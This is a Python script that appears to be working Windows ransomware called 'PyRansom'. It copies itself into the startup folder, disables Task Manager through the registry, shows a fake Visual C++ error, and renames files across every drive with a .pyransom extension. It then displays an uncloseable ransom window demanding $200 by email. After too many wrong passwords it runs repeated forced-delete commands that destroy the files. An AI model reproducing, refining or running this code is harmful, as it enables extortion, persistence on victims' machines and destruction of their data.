import os,sys
import base64
import random
import tkinter as tk
import getpass
import time
from tkinter import messagebox as me
user = getpass.getuser()
sDAHAdEAF = open(r'C:/PyRansom.bat','w')
sDAHAdEAF.write('@echo off\r\ncopy '+sys.executable+' C:\PyRansom.exe\r\nexit')
sDAHAdEAF.close()
os.system('C:/PyRansom.bat')
try:
    checkc = open(f'C:/Users/{user}/Documents/change.txt','r')
    change = int(checkc.read())
    checkc.close()
except:
    change = 5
try:
    copy = open(f'C:/Users/{user}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/PyRansom.bat','w')
    copy.write('@echo off\r\nstart C:\PyRansom.exe')
    copy.close()
except:
    pass
def jing():
    global user
    try:
        filess = open(f'C:/Users/{user}/Documents/tkmgr.reg','w')
        filess.write('Windows Registry Editor Version 5.00\r\n[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System]\r\n"DisableTaskMgr"=dword:02')
        filess.close()
        os.popen(f'start /B regedit /S C:/Users/{user}/Documents/tkmgr.reg')
    except:
        pass
def huan():
    global user
    try:
        filed = open(f'C:/Users/{user}/Documents/tkmgr.reg','w')
        filed.write('Windows Registry Editor Version 5.00\r\n[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System]\r\n"DisableTaskMgr"=dword:00')
        filed.close()
        os.popen(f'start /B regedit /S C:/Users/{user}/Documents/tkmgr.reg')
    except:
        pass
jing()
me.showerror("Microsoft Visual C++ Runtime Error","Runtime error!")
mulu = ['C:/','D:/','E:/','F:/','G:/','H:/',f'C:/Users/{user}/desktop/',f'C:/Users/{user}/',f'C:/Users/']
def lib(mulu):
    def path(path):
        try:
            for file in os.listdir(mulu+path+r"/."):
                if '.' in os.path.splitext(file)[1]:
                    try:
                        os.rename(mulu+path+r'/'+file,mulu+path+r'/'+file+r".pyransom")
                    except:
                        pass
                else:
                    pass
        except:
            pass
    try:
        for file in os.listdir(mulu+r"."):
            try:
                if '.' in os.path.splitext(file)[1]:
                    try:
                        os.rename(mulu+file,mulu+file+".pyransom")
                    except:
                        pass
                else:
                    path(file)
                    pass
            except:
                pass
    except:
        pass
for i in mulu:
    lib(i)
for hhhh in range(1,71):
    try:
        oooo = open(f'C:/Users/{user}/desktop/{hhhh}.txt.pyransom','w')
        oooo.write('Pay Now!!!')
        oooo.close()
    except:
        pass
def close():
    print('You cant leave!')
    return False
temp = open("icon.gif","wb+")
tempb64=base64.b64decode(r'R0lGODlhQABAAPAAAAAAAAAAACH5BAEAAAAAIf8LSW1hZ2VNYWdpY2sOZ2FtbWE9MC40NTQ1NDUAIf8LWE1QIERhdGFYTVA8P3hwYWNrZXQgYmVnaW49J++7vycgaWQ9J1c1TTBNcENlaGlIenJlU3pOVGN6a2M5ZCc/Pgo8eDp4bXBtZXRhIHhtbG5zOng9J2Fkb2JlOm5zOm1ldGEvJyB4OnhtcHRrPSdJbWFnZTo6RXhpZlRvb2wgMTIuNDAnPgo8cmRmOlJERiB4bWxuczpyZGY9J2h0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMnPgoKIDxyZGY6RGVzY3JpcHRpb24gcmRmOmFib3V0PScnCiAgeG1sbnM6dGlmZj0naHR0cDovL25zLmFkb2JlLmNvbS90aWZmLzEuMC8nPgogIDx0aWZmOk9yaWVudGF0aW9uPjE8L3RpZmY6T3JpZW50YXRpb24+CiA8L3JkZjpEZXNjcmlwdGlvbj4KPC9yZGY6UkRGPgo8L3g6eG1wbWV0YT4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKPD94cGFja2V0IGVuZD0ndyc/PgH//v38+/r5+Pf29fTz8vHw7+7t7Ovq6ejn5uXk4+Lh4N/e3dzb2tnY19bV1NPS0dDPzs3My8rJyMfGxcTDwsHAv769vLu6ubi3trW0s7KxsK+urayrqqmop6alpKOioaCfnp2cm5qZmJeWlZSTkpGQj46NjIuKiYiHhoWEg4KBgH9+fXx7enl4d3Z1dHNycXBvbm1sa2ppaGdmZWRjYmFgX15dXFtaWVhXVlVUU1JRUE9OTUxLSklIR0ZFRENCQUA/Pj08Ozo5ODc2NTQzMjEwLy4tLCsqKSgnJiUkIyIhIB8eHRwbGhkYFxYVFBMSERAPDg0MCwoJCAcGBQQDAgEAACwAAAAAQABAAAAC6YSPqavhD5mctBqIs9085a914gSW0Ygi5uqkKQu7IkzLW13blCnxeg+ylH6M4O1DbBiFyKSqyVk6pcyQEwDtZInUI+aK3Xq/U3GVnOyeT2lzRS2D79wuOYkOzuv3NpqfrfMnaDc3aGgVdaiINraoqOUYGZAouUhZeXiJOai5+dfpmbMWKvpGKgjq9/TY+KlkmMoCxNla6gFbG1OEO2q7iporu0vbq/tKbMr7C1xsaxlsfMHaHB2WCS188EydLX3NvXL7naxsXX437Rh7SrjMHo79DlgoDw9ePxmPD4nfftz/4AXAgHUGIigAADs=')
temp.write(tempb64)
temp.close()
ID = random.randint(100000,1000000)
password = str((ID+3)*2)
print("Password:"+password+"    ID:"+str(ID))
root = tk.Tk()
def get():
    global change
    global user
    if change != 0:
        if entry.get() == password:
            os.system('ren *.pyransom *.')
            os.remove(f'C:/Users/{user}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/PyRansom.bat')
            os.remove('C:/PyRansom.bat')
            os.remove(f'C:/Users/{user}/Documents/tkmgr.reg')
            os.remove(f'C:/Users/{user}/Documents/change.txt')
            huan()
            time.sleep(2)
            root.destroy()
        else:
            change = change-1
            wrtc = open(f'C:/Users/{user}/Documents/change.txt','w')
            wrtc.write(change)
            wrtc.close()
    else:
        try:
            os.remove(f'C:/Users/{user}/Documents/change.txt')
        except:
            pass
        os.system('del /f /s /q *.*.pyransom')
        os.system('del /f /s /q *.*.pyransom')
        os.system('del /f /s /q *.*.pyransom')
        os.system('del /f /s /q *.*.pyransom')
        os.system('del /f /s /q *.*.pyransom')
        os.system('del /f /s /q *.*.pyransom')
        os.system('del /f /s /q *.*.pyransom')
        os.system('del /f /s /q *.*.pyransom')
        os.system('del /f /s /q *.*.pyransom')
        os.system('del /f /s /q *.*.pyransom')
        os.system('del /f /s /q *.*.pyransom')
        os.system('del /f /s /q *.*.pyransom')
        os.system('del /f /s /q *.*.pyransom')
        os.system('del /f /s /q *.*.pyransom')
        os.system('del /f /s /q *.*.pyransom')
        os.system('del /f /s /q *.*.pyransom')
        os.system('del /f /s /q *.*.pyransom')
        os.system('del /f /s /q *.*.pyransom')
        os.system('del /f /s /q *.*.pyransom')
        os.system('del /f /s /q *.*.pyransom')
        os.system('del /f /s /q *.*.pyransom')
        os.system('del /f /s /q *.*.pyransom')
        os.system('del /f /s /q *.*.pyransom')
        os.system('del /f /s /q *.*.pyransom')
        os.system('del /f /s /q *.*.pyransom')
        os.system('del /f /s /q *.*.pyransom')
        os.system('del /f /s /q *.*.pyransom')
        os.system('del /f /s /q *.*.pyransom')
        os.system('del /f /s /q *.*.pyransom')
        os.system('del /f /s /q *.*.pyransom')
        os.system('del /f /s /q *.*.pyransom')
        os.system('del /f /s /q *.*.pyransom')
        os.system('del /f /s /q *.*.pyransom')
        os.system('del /f /s /q *.*.pyransom')
        os.system('del /f /s /q *.*.pyransom')
        os.system('del /f /s /q *.*.pyransom')
        os.system('del /f /s /q *.*.pyransom')
        os.system('del /f /s /q *.*.pyransom')
        os.system('del /f /s /q *.*.pyransom')
        os.system('del /f /s /q *.*.pyransom')
        os.system('del /f /s /q *.*.pyransom')
        os.system('del /f /s /q *.*.pyransom')
        os.system('del /f /s /q *.*.pyransom')
        os.system('del /f /s /q *.*.pyransom')
        os.system('del /f /s /q *.*.pyransom')
        exit(0)
root.config(background = "red")
photo = tk.PhotoImage(file="icon.gif")
icon = tk.Label(root,image=photo)
icon.pack()
os.remove("icon.gif")
width = 900
height = 500
screenwidth = root.winfo_screenwidth()
screenheight = root.winfo_screenheight()
alignstr = '%dx%d+%d+%d' % (width, height, (screenwidth-width)/2, (screenheight-height)/2)
root.geometry(alignstr)
root.resizable(width=False,height=False)
root.wm_attributes('-topmost',1)
first = tk.Label(root,text="All your file have been encrypt!",bg="red")
first.config(font=("Arial",20))
first.pack()
a = tk.Label(root,text="All your files have been encrypted due to a security problem with your PC. If you want to restore them, ",bg="red")
a.config(font=("Arial",15))
a.pack()
c = tk.Label(root,text="write us to the e-mail:pythonhavenoname@163.com",bg="red")
c.config(font=("Arial",15))
c.pack()
b = tk.Label(root,text="Write This ID in the title of your message:"+str(ID),bg="red")
b.config(font=("Arial",15))
b.pack()
d = tk.Label(root,text="You should pay 200$ to us.",bg="red")
d.config(font=("Arial",15))
d.pack()
e = tk.Label(root,text="If you pay,we will send you decrypt password.",bg="red")
e.config(font=("Arial",15))
e.pack()
cv = tk.Label(root,text="And,if you shut down your PC or try decrypt you file,all you data will never cant restore!",bg="red")
cv.config(font=("Arial",15))
cv.pack()
try:
    checkc = open(f'C:/Users/{user}/Documents/change.txt','r')
    change = int(checkc.read())
    checkc.close()
    dddh = tk.Label(root,text="(Oh,you restart your PC!)",bg="red")
    dddh.config(font=("Arial",15))
    dddh.pack()
except:
    pass
f = tk.Label(root,text="Remember,you only have "+str(change)+" change.",bg="red")
f.config(font=("Arial",15))
f.pack()
info = tk.Label(root,text="Password:",bg="red")
info.config(font=("Arial",15))
info.pack()
entry = tk.Entry(root,width=100)
entry.pack()
ok = tk.Button(root,text="Decrypt",command=get)
ok.pack(side="bottom")
root.protocol("WM_DELETE_WINDOW",close)
root.overrideredirect(True)
root.mainloop()
